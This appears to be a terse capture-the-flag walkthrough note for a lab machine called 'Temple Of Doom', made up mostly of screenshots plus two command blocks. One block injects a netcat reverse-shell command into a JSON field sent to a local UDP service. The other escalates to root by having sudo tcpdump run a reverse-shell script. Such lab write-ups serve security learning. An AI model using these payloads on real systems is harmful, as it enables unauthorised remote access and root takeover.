# Temple Of Doom
07 April 2022
08:37 AM

<img src="Temple-Of-Doom/media/image1.png" style="width:6.04167in;height:2.09167in" />

<img src="Temple-Of-Doom/media/image2.png" style="width:5.53333in;height:3.025in" />

<img src="Temple-Of-Doom/media/image3.png" style="width:6.00833in;height:2.475in" />

<img src="Temple-Of-Doom/media/image4.png" style="width:4.8in;height:1.5in" />

<img src="Temple-Of-Doom/media/image5.png" style="width:5.93333in;height:1.625in" />

<img src="Temple-Of-Doom/media/image6.png" style="width:5.83333in;height:0.6in" />

nc -u 127.0.0.1 8839
add: {“server\_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.106 4444 ||"}

<img src="Temple-Of-Doom/media/image7.png" style="width:5.75in;height:0.58333in" />

<img src="Temple-Of-Doom/media/image8.png" style="width:5.65833in;height:1.325in" />

<img src="Temple-Of-Doom/media/image9.png" style="width:5.61667in;height:2.375in" />

cd /tmp
echo "nc -e /bin/bash 192.168.1.106 8888" &gt; shell
chmod 777 shell
sudo tcpdump -ln -I eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
or
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root

<img src="Temple-Of-Doom/media/image10.png" style="width:5.58333in;height:1.2in" />

<img src="Temple-Of-Doom/media/image11.png" style="width:5.59167in;height:3.91667in" />
